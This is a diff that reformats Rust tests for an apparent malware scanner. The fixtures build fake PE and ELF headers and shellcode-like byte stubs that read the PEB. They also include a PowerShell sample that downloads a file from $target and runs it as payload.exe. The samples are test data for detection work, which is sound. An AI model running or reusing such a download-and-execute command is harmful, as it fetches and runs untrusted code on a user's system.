@@ -7,37 +7,51 @@ use tempfile::NamedTempFile;
 
 fn make_test_pe() -> Vec<u8> {
     let mut pe = vec![0u8; 1024];
-    pe[0] = b'M'; pe[1] = b'Z';
+    pe[0] = b'M';
+    pe[1] = b'Z';
     pe[60] = 0x80;
-    pe[0x80] = b'P'; pe[0x81] = b'E'; pe[0x82] = 0; pe[0x83] = 0;
-    pe[0x84] = 0x64; pe[0x85] = 0x86;
+    pe[0x80] = b'P';
+    pe[0x81] = b'E';
+    pe[0x82] = 0;
+    pe[0x83] = 0;
+    pe[0x84] = 0x64;
+    pe[0x85] = 0x86;
     pe[0x86] = 1;
-    pe[0x88 + 24] = 0x0b; pe[0x88 + 25] = 0x02;
+    pe[0x88 + 24] = 0x0b;
+    pe[0x88 + 25] = 0x02;
     pe
 }
 
 fn make_test_elf() -> Vec<u8> {
     let mut elf = vec![0u8; 1024];
-    elf[0] = 0x7F; elf[1] = b'E'; elf[2] = b'L'; elf[3] = b'F';
-    elf[4] = 2; elf[5] = 1;
-    elf[16] = 0x02; elf[17] = 0x00;
-    elf[18] = 0x3E; elf[19] = 0x00;
+    elf[0] = 0x7F;
+    elf[1] = b'E';
+    elf[2] = b'L';
+    elf[3] = b'F';
+    elf[4] = 2;
+    elf[5] = 1;
+    elf[16] = 0x02;
+    elf[17] = 0x00;
+    elf[18] = 0x3E;
+    elf[19] = 0x00;
     elf[20] = 1;
-    elf[28] = 0x40; elf[29] = 0x00;
-    elf[40] = 0x40; elf[41] = 0x00;
-    elf[42] = 0x38; elf[43] = 0x00;
+    elf[28] = 0x40;
+    elf[29] = 0x00;
+    elf[40] = 0x40;
+    elf[41] = 0x00;
+    elf[42] = 0x38;
+    elf[43] = 0x00;
     elf[44] = 1;
-    elf[54] = 0x40; elf[55] = 0x00;
+    elf[54] = 0x40;
+    elf[55] = 0x00;
     elf[56] = 1;
     elf
 }
 
 fn make_test_shellcode() -> Vec<u8> {
     vec![
-        0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
-        0x48, 0x8B, 0x40, 0x18,
-        0x48, 0x8B, 0x70, 0x20,
-        0x0F, 0x05,
+        0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B,
+        0x70, 0x20, 0x0F, 0x05,
     ]
 }
 
@@ -50,7 +64,8 @@ param(
 function Invoke-Download {
     Invoke-WebRequest -Uri $target -OutFile payload.exe
 }
-Start-Process payload.exe"#.to_vec()
+Start-Process payload.exe"#
+        .to_vec()
 }
 
 fn make_test_pdf() -> Vec<u8> {
@@ -64,7 +79,11 @@ fn test_scan_pe_file() {
     let mut tmp = NamedTempFile::new().unwrap();
     tmp.write_all(&pe).unwrap();
     let report = scanner.scan_file(tmp.path());
-    assert!(report.file_type.contains("PE"), "Expected PE, got {}", report.file_type);
+    assert!(
+        report.file_type.contains("PE"),
+        "Expected PE, got {}",
+        report.file_type
+    );
     assert_ne!(report.verdict, Verdict::Error);
 }
 
@@ -106,8 +125,11 @@ fn test_scan_powershell_encoded() {
     let mut tmp = NamedTempFile::new().unwrap();
     tmp.write_all(&ps).unwrap();
     let report = scanner.scan_file(tmp.path());
-    assert!(report.file_type.contains("PowerShell"),
-        "Expected PowerShell, got {}", report.file_type);
+    assert!(
+        report.file_type.contains("PowerShell"),
+        "Expected PowerShell, got {}",
+        report.file_type
+    );
     // File type is correctly detected
     // Note: findings require YARA rules to be loaded, which this default scanner doesn't have
 }
@@ -150,8 +172,10 @@ fn test_yara_rules_loaded() {
         tmp.write_all(&ps).unwrap();
         let report = scanner.scan_file(tmp.path());
         // Should have some findings (YARA or other modules)
-        assert!(!report.findings.is_empty(),
-            "Expected findings after loading YARA rules");
+        assert!(
+            !report.findings.is_empty(),
+            "Expected findings after loading YARA rules"
+        );
     }
 }
 
@@ -169,10 +193,8 @@ fn test_pe_suspicion_score() {
 fn test_shellcode_detection_patterns() {
     let scanner = Scanner::new();
     let sc = vec![
-        0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,
-        0x48, 0x8B, 0x40, 0x18,
-        0x48, 0x8B, 0x70, 0x20,
-        0xFF, 0xD6,
+        0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x40, 0x18, 0x48, 0x8B,
+        0x70, 0x20, 0xFF, 0xD6,
     ];
     let mut tmp = NamedTempFile::new().unwrap();
     tmp.write_all(&sc).unwrap();
